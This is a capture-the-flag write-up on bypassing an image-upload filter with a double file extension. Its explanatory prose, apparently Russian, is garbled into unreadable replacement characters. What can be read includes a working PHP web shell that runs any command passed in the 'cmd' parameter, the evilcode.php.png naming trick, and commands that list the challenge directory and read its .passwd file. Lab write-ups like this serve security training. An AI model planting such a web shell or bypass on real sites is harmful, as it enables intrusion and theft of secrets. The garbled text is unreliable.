# File upload - double extensions
20 Points
Gallery v0.02

Statement
Your goal is to hack this photo galery by uploading PHP code.
Retrieve the validation password in the file .passwd at the root of the application.


������ �� �������� �����, ����� ��������� �� ������� upload. ��������� ��������� ���� � �����, �������� php, ������� ����� ��������� ��������� �������. ��� ���:
```php
<?php
    $out = shell_exec($_GET['cmd']);
    echo "<pre>$out</pre>";
?>
```

������� ������� ��� evilcode.php. �� ��������� ����� ������ ����� � ������������ .gif, .jpeg � .png. ���-�, ������� ������� ��� ���� ����������. ����� �� ������� ���� evilcode.php.png � �������� ���. ����� �������� ����� �� ����� �� ���� �������. �� �������� �� ���� � GET-���������� cmd � ������� ������� ����������.
![](image1.png)
�� ������� ��� �������, ��� �� ������ ������� ���� .passwd, ������� ����� � ����� ���������� (�����). ��������� ������� ������ ������ � ���� ���������� � ������� ������� ls -la /challenge/web-serveur/ch20
![](image2.png)

�����, ��� ��� ������������� ���� ���� .passwd. ������� ��� ���������� � ������� �������
> cat /challenge/web-serveur/ch20/.passwd
� ������� ����
